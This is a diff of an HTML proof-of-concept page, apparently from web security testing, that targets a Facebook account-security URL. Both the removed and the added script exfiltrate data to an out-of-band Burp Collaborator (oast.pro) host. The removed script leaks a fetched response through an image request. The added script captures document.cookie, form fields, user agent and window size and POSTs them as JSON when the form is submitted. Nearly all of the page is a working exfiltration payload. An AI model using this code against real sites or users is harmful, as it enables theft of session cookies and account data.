@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>108 Capture Redirection Response</title>
+    <title>108 20 Capture and Send to Burp Collaborator</title>
 </head>
 <body>
     <form id="myForm" method="GET" action="https://www.facebook.com:443/recent_emails/security/?hide_back_button=1&from_accounts_center=1">
@@ -12,35 +12,49 @@
         <input type="submit" value="Send">
     </form>
     <script>
-        // Function to capture redirection response after a delay
-        function captureRedirectionResponseWithDelay() {
-            setTimeout(function() {
-                var form = document.getElementById('myForm');
-                var formData = new FormData(form); // Extract form data
-                var queryString = new URLSearchParams(formData).toString(); // Convert form data to query string
-                var actionUrl = form.getAttribute('action'); // Get form action URL
-                var xhr = new XMLHttpRequest();
-                xhr.open('GET', actionUrl + '?' + queryString, true);
-                xhr.onreadystatechange = function() {
-                    if (xhr.readyState === XMLHttpRequest.DONE) {
-                        // Capture the response
-                        var response = xhr.responseText;
-                        // Send the response to the Burp Suite collaborator
-                        var img = new Image();
-                        img.src = "http://co4oiq53nckmdhpt89g0rjnkujqxocigt.oast.pro?response=" + encodeURIComponent(response);
-                    }
-                };
-                xhr.send();
-            }, 2000); // Adjust the delay as needed (in milliseconds)
+        // Function to capture and send data to Burp Collaborator
+        function captureAndSendToBurpCollaborator() {
+            // Capture form data
+            var formData = new FormData(document.getElementById('myForm'));
+
+            // Construct request object
+            var request = {
+                url: document.getElementById('myForm').action,
+                method: document.getElementById('myForm').method,
+                headers: {},
+                cookies: document.cookie,
+                formData: {},
+                userAgent: navigator.userAgent,
+                windowSize: {
+                    width: window.innerWidth,
+                    height: window.innerHeight
+                }
+            };
+
+            // Get request headers
+            for (var [key, value] of formData.entries()) {
+                request.formData[key] = value;
+            }
+
+            // Convert request object to JSON
+            var jsonData = JSON.stringify(request);
+
+            // Send captured data to Burp Collaborator
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', 'http://co4oiq53nckmdhpt89g0rjnkujqxocigt.oast.pro', true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === XMLHttpRequest.DONE) {
+                    console.log('Captured data sent to Burp Collaborator successfully');
+                }
+            };
+            xhr.send(jsonData);
         }
 
-        // Function to intercept form submission and capture redirection response
+        // Intercept form submission and capture data
         document.getElementById('myForm').addEventListener('submit', function(event) {
-            event.preventDefault(); // Prevent the form from being submitted
-            // Perform form submission
-            document.getElementById('myForm').submit();
-            // Capture redirection response after a delay
-            captureRedirectionResponseWithDelay();
+            event.preventDefault(); // Prevent form submission
+            captureAndSendToBurpCollaborator(); // Capture and send data
         });
     </script>
 </body>
